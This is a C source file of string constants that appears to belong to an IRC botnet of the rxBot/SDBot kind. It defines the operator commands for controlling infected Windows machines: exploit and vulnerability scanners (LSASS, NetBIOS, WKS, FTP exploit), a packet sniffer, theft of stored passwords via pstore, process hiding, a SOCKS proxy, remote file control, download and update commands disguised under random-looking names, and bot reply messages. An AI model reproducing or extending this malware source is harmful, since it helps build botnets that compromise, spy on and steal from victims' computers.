
const char cmd_on[]				= "on";
const char cmd_off[]			= "off";
const char cmd_all[]			= "all";

const char cmd_login_1[]		= "login";
const char cmd_login_2[]		= "l";

const char cmd_threads_1[]		= "threads";
const char cmd_threads_2[]		= "t";
const char cmd_threads_sub[]	= "sub";
const char cmd_threads_kill_1[]	= "kill";
const char cmd_threads_kill_2[]	= "k";

const char cmd_logout_1[]		= "logout";
const char cmd_logout_2[]		= "lo";

const char cmd_who[]			= "who";

const char cmd_remove_1[]		= "dasr33deasde";
const char cmd_remove_2[]		= "dsad32gghe";

#ifndef NO_DLLTEST
const char cmd_testdlls[]		= "testdlls";
#endif

#ifndef NO_CEL
const char cmd_cel[]			= "cel";
#endif

const char cmd_uptime_1[]		= "uptime";
const char cmd_uptime_2[]		= "up";

#ifndef NO_INSTALLED_TIME
const char cmd_insttime_1[]		= "installed";
const char cmd_insttime_2[]		= "it";
#endif

#ifndef NO_BOTVERSION
const char cmd_version_1[]		= "version";
const char cmd_version_2[]		= "v";
#endif

#ifndef NO_STATUS
const char cmd_status_1[]		= "status";
const char cmd_status_2[]		= "s";
#endif

#ifndef NO_SECURE
const char cmd_secure_1[]		= "secure";
const char cmd_secure_2[]		= "sec";
const char cmd_unsecure_1[]		= "unsecure";
const char cmd_unsecure_2[]		= "unsec";
#endif

#ifndef NO_PROCESS
const char cmd_process_1[]		= "process";
const char cmd_process_2[]		= "ps";
const char cmd_process_list[]	= "list";
const char cmd_process_kill[]	= "kill";
const char cmd_process_del[]	= "del";
const char cmd_process_hide[]	= "hide";
const char cmd_process_create[]	= "create";
#endif

const char cmd_nickupd_1[]		= "nickupdate";
const char cmd_nickupd_2[]		= "nu";
const char cmd_rndnick_1[]		= "randnick";
const char cmd_rndnick_2[]		= "rand";

#ifndef NO_EFTPD
const char cmd_eftpd_1[]		= "exploitftpd";
const char cmd_eftpd_2[]		= "eftpd";
#endif

#ifndef NO_SOCK4SERV
const char cmd_socks4_1[]		= "socks4";
const char cmd_socks4_2[]		= "s4";
#endif

#ifndef NO_REDIRECT
const char cmd_redirect_1[]		= "redirect";
const char cmd_redirect_2[]		= "rd";
#endif

#ifndef NO_SPEEDTEST
const char cmd_speedtest_1[]	= "speedtest";
const char cmd_speedtest_2[]	= "speed";
#endif

#ifndef NO_NETSTATP
const char cmd_netstatp_1[]		= "netstatp";
const char cmd_netstatp_2[]		= "nsp";
#endif

#ifndef NO_SNIFFER
const char cmd_sniffer_1[]		= "sniffer";
const char cmd_sniffer_2[]		= "sniff";
#endif

#ifndef NO_IESTART
const char cmd_iestart_1[] 		= "iestart";
const char cmd_iestart_2[] 		= "ies";
#endif

#ifndef NO_ENCRYPT
const char cmd_encrypt_1[]		= "encrypt";
const char cmd_encrypt_2[]		= "enc";
#endif

const char cmd_join_1[]			= "join";
const char cmd_join_2[]			= "j";

const char cmd_part_1[]			= "part";
const char cmd_part_2[]			= "p";

const char cmd_raw_1[]			= "raw";
const char cmd_raw_2[]			= "r";

const char cmd_prefix_1[]		= "prefix";
const char cmd_prefix_2[]		= "pr";

const char cmd_dns_1[]			= "resolve";
const char cmd_dns_2[]			= "dns";

#ifndef NO_ADVSCAN
const char cmd_currentip_1[]	= "currentip";
const char cmd_currentip_2[]	= "cip";
const char cmd_scanstats_1[]	= "stats";
const char cmd_scanstats_2[]	= "st";
const char cmd_banscan_1[]		= "banner";
const char cmd_banscan_2[]		= "ban";
const char cmd_advscan_1[]		= "advscan";
const char cmd_advscan_2[]		= "asc";
const char cmd_scanall_1[]		= "scanall";
const char cmd_scanall_2[]		= "sa";
const char cmd_lsascan_1[]		= "lsascan";
const char cmd_lsascan_2[]		= "lsa";
const char cmd_ntscan_1[]		= "ntscan";
const char cmd_ntscan_2[]		= "nts";
const char cmd_wksescan_1[]		= "wksescan";
const char cmd_wksescan_2[]		= "wkse";
const char cmd_wksoscan_1[]		= "wksoscan";
const char cmd_wksoscan_2[]		= "wkso";
#endif

#ifndef NO_FLUSHARP
const char cmd_flusharp_1[]		= "flusharp";
const char cmd_flusharp_2[]		= "farp";
#endif

#ifndef NO_FLUSHDNS
const char cmd_flushdns_1[]		= "flushdns";
const char cmd_flushdns_2[]		= "fdns";
#endif

#ifndef NO_PSTORE
const char cmd_pstore_1[]		= "pstore";
const char cmd_pstore_2[]		= "pst";
#endif

#ifndef NO_SYSINFO
const char cmd_sysinfo_1[]		= "sysinfo";
const char cmd_sysinfo_2[]		= "si";
#endif

#ifndef NO_NETINFO
const char cmd_netinfo_1[]		= "netinfo";
const char cmd_netinfo_2[]		= "ni";
#endif

#ifndef NO_DRIVEINFO
const char cmd_drvinfo_1[]		= "driveinfo";
const char cmd_drvinfo_2[]		= "di";
const char cmd_drvinfo_total_1[]= "total";
const char cmd_drvinfo_total_2[]= "t";
const char cmd_drvinfo_mb[]		= "mb";
const char cmd_drvinfo_gb[]		= "gb";
#endif

#ifndef NO_MIRCCMD
const char cmd_mirccmd_1[] 		= "mirccmd";
const char cmd_mirccmd_2[] 		= "mirc";
#endif

const char cmd_system_1[] 		= "system";
const char cmd_system_2[] 		= "sys";


#ifndef NO_FILECTRL
const char cmd_filectrl_1[]		= "file";
const char cmd_filectrl_2[]		= "f";

const char cmd_filectrl_read_1[]= "type";
const char cmd_filectrl_read_2[]= "cat";
const char cmd_filectrl_exst_1[]= "exists";
const char cmd_filectrl_exst_2[]= "ex";
const char cmd_filectrl_del_1[]	= "del";
const char cmd_filectrl_del_2[]	= "rm";
const char cmd_filectrl_rmdir[]	= "rmdir";
const char cmd_filectrl_move_1[]= "move";
const char cmd_filectrl_move_2[]= "mv";
const char cmd_filectrl_copy_1[]= "copy";
const char cmd_filectrl_copy_2[]= "cp";
const char cmd_filectrl_att_1[]	= "attrib";
const char cmd_filectrl_att_2[]	= "at";
const char cmd_filectrl_open_1[]= "open";
const char cmd_filectrl_open_2[]= "op";
#endif

#ifndef NO_DOWNLOAD
const char cmd_download_1[]		= "r.down";
const char cmd_download_2[]		= "r.wget";
const char cmd_update_1[]		= "sdadwadaw33eadsafr";
const char cmd_update_2[]		= "asd33rt3qf";
#endif

#ifndef NO_IFELSE
const char cmd_if_1[]			= "if";
const char cmd_if_2[]			= "i";
const char cmd_else_1[]			= "else";
const char cmd_else_2[]			= "e";
const char cmd_ifelse_nick_1[]	= "nick";
const char cmd_ifelse_nick_2[]	= "n";
const char cmd_ifelse_host_1[]	= "host";
const char cmd_ifelse_host_2[]	= "h";
const char cmd_ifelse_id[]		= "id";
const char cmd_ifelse_uptime_1[]= "uptime";
const char cmd_ifelse_uptime_2[]= "up";
const char cmd_ifelse_ruptime_1[]="recordup";
const char cmd_ifelse_ruptime_2[]="rup";
const char cmd_ifelse_priv_1[]	= "private";
const char cmd_ifelse_priv_2[]	= "p";
const char cmd_ifelse_status_1[]= "status";
const char cmd_ifelse_status_2[]= "s";
#endif


char str_auth_good[]	= "%s Password accepted.";
char str_auth_full[]	= "%s Login failed, too many logged in users.";
char str_spy_privmsg[]	= "%s Possible spy: %s!%s@%s (Sent PM: \"%s\")";
char str_auth_bad[]		= "%s Failed authentication by: %s!%s@%s (Pass Tried: %s)";

char str_logout[]		= "%s User %s logged out.";
char str_sl_logout[]	= "%s Slot <%i> logged out.";
char str_sl_no_logout[]	= "%s No user logged in at slot: <%i>";
char str_sl_in_logout[]	= "%s Invalid login slot number: <%i>";

char str_thread_stop[]	= "%s Stopped: <%d> thread(s).";
char str_thread_ac[]	= "%s No active threads found.";
char str_thread_kill[]	= "%s Killed thread: <%s>";
char str_thread_fkill[]	= "%s Failed to kill thread: <%s>";
char str_thread_alr[]	= "%s %s already running at thread number: <%d>.";
char str_thread_fail[]	= "%s Failed to start %s, error: <%d>.";

char str_status[]		= "%s Status: %s. Box Uptime: %s, Bot Uptime: %s, Connected for: %s.";

char str_installed[]	= "%s Bot installed on: %s.";

char str_kick_msg[]		= "Go fuck yourself %s.";


char str_auth_ali[]		= "%s You are already logged in.";
char str_quit_rem[]		= "Remove command received from: %s!%s@%s";
char str_quit_upd[]		= "Update command received.";
char str_noadvapi[]		= "%s Advapi.dll is not loaded.";
char str_nopstore[]		= "%s PStore.dll is not loaded.";


char str_main_thread[]	= "%s Main bot thread.";
char str_rup_thread[]	= "%s Record uptime checker.";
char str_asecure_thread[]= "%s Auto-Secure.";

char str_bad_format[]	= "%s Missing parameter(s).";

char str_exip_resolve[] = "Couldn't resolve host";
